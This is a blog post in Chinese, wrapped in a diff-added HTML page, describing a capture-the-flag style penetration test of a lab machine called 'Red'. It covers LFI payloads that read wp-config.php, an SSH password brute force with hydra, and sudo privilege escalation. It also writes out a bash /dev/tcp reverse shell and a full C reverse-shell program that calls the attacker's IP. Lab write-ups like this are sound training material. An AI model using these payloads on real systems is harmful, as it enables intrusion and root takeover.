@@ -1,0 +1,347 @@
+<!DOCTYPE html>
+<html class="dark" lang="zh-CN" prefix="og: http://ogp.me/ns# 
+fb: http://ogp.me/ns/fb#
+article: http://ogp.me/ns/article#">
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="keywords" content="">
+
+<title>对Red的渗透测试 || woejk0x&#39;s blogs</title>
+<link rel="icon" href="https://wo3jk.github.ioimages/wang.icon" type="image/x-icon">
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<meta property="og:title" content="woejk0x&#39;s blogs">
+<meta property="og:type" content="website">
+<meta property="og:url" content="https://wo3jk.github.io/2026/01/22/%E5%AF%B9Red%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/index.html">
+<meta property="og:image" content="">
+<meta property="og:site_name" content="woejk0x&#39;s blogs">
+<meta property="og:author" content="woejk0x">
+
+  
+  
+  
+  <meta name="description" content="信息收集主机发现123nmap-sn192.168.59.1/24或者是arp-scan-l![](&amp;#x2F;对Red的渗透测试&amp;#x2F;Pastedimage20260119131713.png)发现主机：192.168.59.140端口扫描1nmap-sV-p-192.168.59.140![](&amp;#">
+
+
+<script src="/js/wang.js"></script>
+
+<link rel="stylesheet" href="/css/wang.css">
+<script> console.log("Hello hexo-theme-wang"); </script>
+<meta name="generator" content="Hexo 8.1.1"></head>
+<body>
+<main>
+    <div id="agplAlert" style="z-index: 9999;">
+    <strong>请遵守AGPL 3.0协议</strong> 本主题已开源于<a target="_blank" rel="noopener" href="https://github.com/xingwangzhe/hexo-theme-wang">hexo-theme-wang</a>
+</div>
+    <header>
+    <nav>
+        <ul>
+            
+                <li>
+                    <a href="/" rel="noopener">
+                        
+                            <img src="/images/menu_ico/home.svg" class="menu-icon" alt="首页">
+                        
+                        首页
+                    </a>
+                </li>
+            
+                <li>
+                    <a href="/archives" rel="noopener">
+                        
+                            <img src="/images/menu_ico/archives.svg" class="menu-icon" alt="归档">
+                        
+                        归档
+                    </a>
+                </li>
+            
+                <li>
+                    <a href="/categories" rel="noopener">
+                        
+                            <img src="/images/menu_ico/categories.svg" class="menu-icon" alt="分类">
+                        
+                        分类
+                    </a>
+                </li>
+            
+                <li>
+                    <a href="/tags" rel="noopener">
+                        
+                            <img src="/images/menu_ico/tags.svg" class="menu-icon" alt="标签">
+                        
+                        标签
+                    </a>
+                </li>
+            
+                <li>
+                    <a href="/about" rel="noopener">
+                        
+                            <img src="/images/menu_ico/about.svg" class="menu-icon" alt="关于">
+                        
+                        关于
+                    </a>
+                </li>
+            
+                <li>
+                    <a href="/links" rel="noopener">
+                        
+                            <img src="/images/menu_ico/links.svg" class="menu-icon" alt="友链">
+                        
+                        友链
+                    </a>
+                </li>
+            
+            
+        </ul>
+    </nav>
+</header>
+
+<script src="/js/header.js"></script>
+
+
+    
+    <aside class="sidebar-container sidebar-left">
+    <div class="sidebar-bg">
+        <h2 class="site-title">woejk0x's blogs</h2>
+        <img class="avatar avatar-round" src="/images/Myblogs.jpg" style="width:50px;" alt="网站头像">
+        <h2 class="site-author">woejk0x</h2>
+        <h3 class="site-subtitle">网络安全爱好者，目标是成为一名优秀的渗透测试工程师</h3>
+    </div>
+    <div class="sidebar-bg">
+        <ul class="social_links">
+            
+                <li>
+                    <a target="_blank" rel="noopener" href="https://github.com/Wo3jk" aria-label="Github的链接">
+                        
+                            <div style="display: flex; margin-left: auto; margin-left: auto; justify-content: center;">
+                                <img src="/images/social_links/github.svg" class="icon" alt="Github的图标"><p>Github</p>
+                            </div>
+                        
+                    </a>
+                </li>
+            
+        </ul>
+    </div>
+</aside>
+<div class="post-container">
+  <article class="post">
+    <h1 class="post-title"></h1>
+
+    <div class="post-meta">
+      <span class="post-date">发布于 <time datetime="2026-01-22T08:14:57.264Z">2026-01-22</time></span>
+      
+      
+        <span class="post-updated">
+          最后更新于 <time datetime="2026-01-22T08:18:19.532Z">2026-01-22</time>
+        </span>
+      
+      <span style="margin-left:10px;">👁<span id="busuanzi_value_page_pv"></span></span>
+    </div>
+    <div class="post-content">
+      <h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><h2 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nmap -sn 192.168.59.1/24</span><br><span class="line">或者是</span><br><span class="line">arp-scan -l</span><br></pre></td></tr></table></figure>
+<p>![](&#x2F;对Red的渗透测试&#x2F;Pasted image 20260119131713.png)<br>发现主机：192.168.59.140</p>
+<h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV -p- 192.168.59.140</span><br></pre></td></tr></table></figure>
+<p>![](&#x2F;对Red的渗透测试&#x2F;Pasted image 20260119142212.png)<br>这里还有一个命令：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sS -A -T4 192.168.56.101</span><br></pre></td></tr></table></figure>
+<p>![](&#x2F;对Red的渗透测试&#x2F;Pasted image 20260119142557.png)<br>这个扫描命令的结果更详细，可以看到80端口使用的是WordPress框架<br>访问80端口，发现各链接都无法正常跳转，<br>![](Pasted image 20260119150652.png)![](Pasted image 20260119150710.png)<br>修改hosts解析  </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/hosts</span><br></pre></td></tr></table></figure>
+<p>再次访问<br>![](&#x2F;对Red的渗透测试&#x2F;Pasted image 20260119150928.png)<br>backdoor说明网站已经存在后门<br>使用gobuster对网站目录进行爆破</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir -u http://redrocks.win -w /usr/share/seclists/Discovery/Web-Content/Programming-Language-Specific/CommonBackdoors-PHP.fuzz.txt</span><br></pre></td></tr></table></figure>
+<p>![](&#x2F;对Red的渗透测试&#x2F;Pasted image 20260122131115.png)<br>访问查看发现是存在该页面但是无显示,猜测可能存在本地文件包含,应该需要一个参数指定包含的文件名<br>使用wfuzz工具爆破，同样用刚刚工具的字典,但扫不了多少次，靶机就崩了，把参数key放前面点才行![](Pasted image 20260122132933.png)<br>确定了传参的参数，进行测试:?key&#x3D;…&#x2F;…&#x2F;…&#x2F;etc&#x2F;passw<br>证明该处存在LFI漏洞，因为这个&#x2F;NetworkFileManagerPHP.php页面是留下的后门，使用常规的页面无法查看，此时使用PHP伪协议进行读取后门文件的内容。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?key=php://filter/read=convert.base64-encode/resource=NetworkFileManagerPHP.php</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">   $file = $_GET[&#x27;key&#x27;];</span><br><span class="line">   if(isset($file))</span><br><span class="line">   &#123;</span><br><span class="line">       include(&quot;$file&quot;);</span><br><span class="line">   &#125;</span><br><span class="line">   else</span><br><span class="line">   &#123;</span><br><span class="line">       include(&quot;NetworkFileManagerPHP.php&quot;);</span><br><span class="line">   &#125;</span><br><span class="line">   /* VGhhdCBwYXNzd29yZCBhbG9uZSB3b24ndCBoZWxwIHlvdSEgSGFzaGNhdCBzYXlzIHJ1bGVzIGFyZSBydWxlcw== */</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>![](&#x2F;对Red的渗透测试&#x2F;Pasted image 20260122134251.png)译文：光是那个密码帮不了你!Hashcat说规则就是规则<br>并没有什么用，但提到了hashcat,于是寻找账号密码信息，因为是WordPress，所以查找该配置文件信息wp-config.php<br>还是使用伪协议进行读取<br>?key&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;wp-config.php<br>![](&#x2F;对Red的渗透测试&#x2F;Pasted image 20260122135602.png)<br>这其中提到一个john的用户<br>密码：R3v_m4lwh3r3_k1nG!!<br>但ssh却登录不上，密码是错误的，回想起前面提到的hashcat和频繁出现的base64加密，所以也接下来要使用进行碰撞</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">vim 1.txt，添加内容：R3v_m4lwh3r3_k1nG!!</span><br><span class="line">hashcat --stdout 1.txt -r /usr/share/hashcat/rules/best64.rule &gt; passwd.txt</span><br><span class="line">–stdout 不破解hash，只输出</span><br><span class="line">-r 使用指定的规则</span><br></pre></td></tr></table></figure>
+<p>![](&#x2F;对Red的渗透测试&#x2F;Pasted image 20260122135841.png)</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -l john -P passwd.txt 192.168.59.140 ssh</span><br></pre></td></tr></table></figure>
+<p>![](&#x2F;对Red的渗透测试&#x2F;Pasted image 20260122140212.png)<br>![](&#x2F;对Red的渗透测试&#x2F;Pasted image 20260122140228.png)<br>连接突然断了![](Pasted image 20260122141036.png)<br>![](&#x2F;对Red的渗透测试&#x2F;Pasted image 20260122141051.png)<br>这里应该是对密码做了一些策略，因为每隔一段时间的密码就会刷新一下<br>提示说cat命令有问题，确实，回显的是以vi格式打开的，应该是vi和cat互换了![](Pasted image 20260122141824.png)</p>
+<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>发现ippsec用户在不需要密码的情况下就可以执行&#x2F;usr&#x2F;bin&#x2F;time命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure>
+<p>![](&#x2F;对Red的渗透测试&#x2F;Pasted image 20260122143758.png)<br>使用sudo -u提权到ippsec  </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -u ippsec /usr/bin/time /bin/bash</span><br></pre></td></tr></table></figure>
+<p>![](&#x2F;对Red的渗透测试&#x2F;Pasted image 20260122143829.png)<br>因为ssh连接过一段时间就会断开并修改密码，所以需要建立一个权限维持<br>首先向攻击机反弹一个shell  </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.59.128/4444 0&gt;&amp;1</span><br><span class="line">攻击机监听端口4444</span><br><span class="line">nc -lnvp 4444</span><br></pre></td></tr></table></figure>
+<p>这时想到刚刚ssh连接的时候，靶机每隔段时间都会弹出消息，那就说明 靶机中有程序在运行，又或是有进程在执行的，这时可以考虑一个监听工具，用来监听靶机的进程。<br><a target="_blank" rel="noopener" href="https://github.com/DominicBreuker/pspy?tab=readme-ov-file">https://github.com/DominicBreuker/pspy?tab=readme-ov-file</a><br>kali攻击机打开web服务，靶机从攻击机上进行下载这个工具  </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server</span><br></pre></td></tr></table></figure>
+<p>下载之后提示不兼容<br>这台靶机的系统（GLIBC）版本较低，我们需要下载一个很老的 pspy 版本，通常 <strong>v1.2.0</strong> 或 <strong>v1.0.0</strong> 兼容性最好。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"># 1. 先把刚才下载乱了的文件都删掉，清空环境</span><br><span class="line">rm pspy64s pspy64s.1</span><br><span class="line"></span><br><span class="line"># 2. 下载 v1.2.0 版本（这个版本对老系统支持较好）</span><br><span class="line">wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64s</span><br><span class="line"></span><br><span class="line"># 3. 赋予执行权限</span><br><span class="line">chmod +x pspy64s</span><br><span class="line"></span><br><span class="line"># 4. 运行</span><br><span class="line">./pspy64s</span><br></pre></td></tr></table></figure>
+<p>找到后门位置![](Pasted image 20260122152742.png)</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd /var/www/wordpress/.git  </span><br><span class="line">ls -al</span><br></pre></td></tr></table></figure>
+<p>![](&#x2F;对Red的渗透测试&#x2F;Pasted image 20260122152818.png)<br>来到该目录下，查看一下文件权限，都是root权限的文件  </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -l</span><br></pre></td></tr></table></figure>
+<p>![](&#x2F;对Red的渗透测试&#x2F;Pasted image 20260122152846.png)<br>查看一下这个.c文件的内容  </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi supersecretfileuc.c</span><br></pre></td></tr></table></figure>
+<p>![](&#x2F;对Red的渗透测试&#x2F;Pasted image 20260122152911.png)<br>这是使用C语言写的代码，在文件所处位置的文件夹内还有一个rev的文件，这是经过supersecretfileuc.c编译完成后生成的程序，执行后会输出信息。就是red时不时弹出信息。将rev删除后会重新编译产生，并且是root权限,但没有权限更改文件内容，所以打算直接将这两个文件删掉，然后重新上传一个名为supersecretfileuc.c文件并在其中写入一个反弹shell的程序代码，这样只要supersecretfileuc.c文件被执行，root权限的shell就会被反弹到攻击机上。<br>需要写可以反弹shell的脚本，在网上找了一下，<a target="_blank" rel="noopener" href="https://www.revshells.com/%E8%BF%99%E4%B8%AA%E7%BD%91%E7%AB%99%E5%8F%AF%E4%BB%A5%E5%86%99C%E7%9A%84%E5%8F%8D%E5%BC%B9shell%E7%9A%84%E8%84%9A%E6%9C%AC%E3%80%82">https://www.revshells.com/这个网站可以写C的反弹shell的脚本。</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;sys/socket.h&gt;</span><br><span class="line">#include &lt;sys/types.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">#include &lt;netinet/in.h&gt;</span><br><span class="line">#include &lt;arpa/inet.h&gt;</span><br><span class="line"></span><br><span class="line">int main(void)&#123;</span><br><span class="line">    int port = 5555;</span><br><span class="line">    struct sockaddr_in revsockaddr;</span><br><span class="line"></span><br><span class="line">    int sockt = socket(AF_INET, SOCK_STREAM, 0);</span><br><span class="line">    revsockaddr.sin_family = AF_INET;       </span><br><span class="line">    revsockaddr.sin_port = htons(port);</span><br><span class="line">    revsockaddr.sin_addr.s_addr = inet_addr(&quot;192.168.59.128&quot;);</span><br><span class="line"></span><br><span class="line">    connect(sockt, (struct sockaddr *) &amp;revsockaddr, </span><br><span class="line">    sizeof(revsockaddr));</span><br><span class="line">    dup2(sockt, 0);</span><br><span class="line">    dup2(sockt, 1);</span><br><span class="line">    dup2(sockt, 2);</span><br><span class="line"></span><br><span class="line">    char * const argv[] = &#123;&quot;/bin/bash&quot;, NULL&#125;;</span><br><span class="line">    execvp(&quot;/bin/bash&quot;, argv);</span><br><span class="line"></span><br><span class="line">    return 0;       </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">rm -f rev</span><br><span class="line">rm -f supersecretfileuc.c</span><br></pre></td></tr></table></figure>
+<p>这里我给的靶机内存不够，使用软链接<br><strong>在内存目录下载文件：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd /dev/shm</span><br><span class="line">wget http://192.168.59.128:8000/supersecretfileuc.c</span><br></pre></td></tr></table></figure>
+<p><strong>回到目标目录建立软链接：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd /var/www/wordpress/.git</span><br><span class="line">ln -s /dev/shm/supersecretfileuc.c supersecretfileuc.c</span><br></pre></td></tr></table></figure>
+<p>![](&#x2F;对Red的渗透测试&#x2F;Pasted image 20260122161252.png)<br>上传成功，攻击机监听5555端口，等待连接，就可以得到root权限了<br>![](&#x2F;对Red的渗透测试&#x2F;Pasted image 20260122160637.png)<br>查看flag<br>![](&#x2F;对Red的渗透测试&#x2F;Pasted image 20260122161404.png)</p>
+
+    </div>
+  </article>
+  <div class="ccbyncsa">
+    <div class="container">
+        <div class="row">
+            <div class="col-md-12">
+                <div class="copyright">
+                    <div class="author">
+                        <p>作者</p>
+                        <p>woejk0x</p>
+                    </div>
+                    <div class="title">
+                        <p>标题</p>
+                        <p></p>
+                    </div>
+                        <div class="publish">
+                            <p>发布于</p>
+                            <p>2026-01-22</p>
+                        </div>
+                    <div class="ccbyncsa-icon">
+                        <p>授权协议</p>
+                        <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">
+                        <p class="ccbyncsa-icon-imgs" style="display: flex;">
+                        <img src="/images/cc.svg" alt="cc">
+                        <img src="/images/by.svg" alt="by">
+                        <img src="/images/nc.svg" alt="nc">
+                        <img src="/images/sa.svg" alt="sa">
+                        </p>
+                        </a>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+  <nav class="post-pagination">
+    
+      <div class="post-prev">
+        <span class="nav-label">上一篇</span>
+        <a href="/2026/01/19/%E5%AF%B9earth%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">对earth的渗透测试</a>
+      </div>
+    
+    
+  </nav>
+  
+
+</div>
+
+<script src="/js/copy.js"></script>
+
+<aside class="sidebar-container sidebar-right">
+    <div class="sidebar-bg">
+        <p id="date"></p>
+<script>
+  function updateDate() {
+    var now = new Date();
+    var dateString = now.toISOString().slice(0, 10);
+    document.getElementById('date').textContent = dateString;
+  }
+
+  window.addEventListener('load', function() {
+    updateDate();
+    // 更新频率为每5分钟更新一次，减少不必要的更新
+    setInterval(updateDate, 300000);
+  });
+</script>
+        <span id="clock" role="timer" aria-live="polite"></span>
+
+
+<script>
+  document.addEventListener('DOMContentLoaded', function() {
+    const clockElement = document.getElementById('clock');
+    let timerInterval;
+
+    // 格式化时间函数
+    function formatTime(unit) {
+      return unit < 10 ? '0' + unit : unit;
+    }
+
+    // 更新时钟 - 包含秒
+    function updateClock() {
+      const now = new Date();
+      const hours = formatTime(now.getHours());
+      const minutes = formatTime(now.getMinutes());
+      const seconds = formatTime(now.getSeconds());
+      clockElement.textContent = `${hours}:${minutes}:${seconds}`;
+    }
+
+    // 初始化时钟
+    function startClock() {
+      // 立即更新一次时间
+      updateClock();
+      // 每秒更新一次
+      timerInterval = setInterval(updateClock, 1000);
+    }
+
+    // 页面可见性变化时的优化
+    document.addEventListener('visibilitychange', function() {
+      if (document.hidden) {
+        // 页面不可见时停止更新
+        clearInterval(timerInterval);
+      } else {
+        // 页面重新可见时，重新开始
+        clearInterval(timerInterval);
+        startClock();
+      }
+    });
+
+    // 启动时钟
+    startClock();
+  });
+</script>
+
+
+    </div>
+    <div class="sidebar-bg">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">1.</span> <span class="toc-text">信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%BB%E6%9C%BA%E5%8F%91%E7%8E%B0"><span class="toc-number">1.1.</span> <span class="toc-text">主机发现</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="toc-number">1.2.</span> <span class="toc-text">端口扫描</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%8F%90%E6%9D%83"><span class="toc-number">2.</span> <span class="toc-text">提权</span></a></li></ol>
+    </div>
+    <div class="sidebar-bg">
+        <div class="card-tags">
+            
+        </div>
+    </div>
+    <div>
+        <div class="categories-list">
+            
+        </div>
+    </div>
+</aside>
+
+    <!-- No categories available -->
+
+
+    <footer>
+    <span id="busuanzi_container_site_pv" style="display: inline;"></span>
+    <span>👁<span id="busuanzi_value_site_pv"></span></span>
+    <div class="padding border border-sub border-dotted fadein-right">
+        <span style="color:aliceblue">👤<span id="busuanzi_value_site_uv"></span></span>
+    </div>
+    <span>
+        由 <a target="_blank" rel="noopener" href="https://hexo.io" alt="Hexo">
+            <p class="hover-underline night" style="display: inline;">Hexo</p>
+        </a> 驱动
+        <p style="display: inline; color: red;">❤</p>
+        <a target="_blank" rel="noopener" href="https://github.com/xingwangzhe/hexo-theme-wang" alt="Wang">
+            <p class="hover-underline night" style="display: inline;">Wang</p>
+        </a> 主题构建
+    </span>
+
+    <!-- 带图片的链接 -->
+    <div class="footer-links">
+        
+    </div>
+
+    <!-- 纯文本链接 -->
+    <div class="footer-text-links">
+        
+    </div>
+</footer>
+    
+<script src="/js/background.js"></script>
+    
+</main>
+</body>
+</html>
